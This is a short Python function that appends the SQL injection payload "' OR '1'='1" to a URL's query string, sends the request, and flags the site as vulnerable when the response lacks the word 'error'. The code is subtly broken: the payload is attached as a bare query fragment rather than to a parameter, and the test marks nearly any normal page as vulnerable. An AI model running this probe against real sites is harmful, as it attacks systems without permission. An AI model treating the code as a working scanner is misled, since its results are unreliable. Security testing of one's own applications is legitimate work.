import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

def check_sql_injection(url):
    # Parse the URL
    parsed_url = urlparse(url)
    
    # Ensure the payload is added to the query string
    query_string = parsed_url.query
    
    # Prepare the payload
    sql_payload = "' OR '1'='1"
    
    # Add the payload to the query string
    if query_string:
        query_string += f"&{sql_payload}"
    else:
        query_string = sql_payload
    
    # Reconstruct the full URL with the payload in the query string
    url_with_payload = urlunparse(parsed_url._replace(query=query_string))
    
    # Send the request
    response = requests.get(url_with_payload)
    
    # Check for potential vulnerability indicators in the response
    if "error" not in response.text.lower():
        return True
    return False


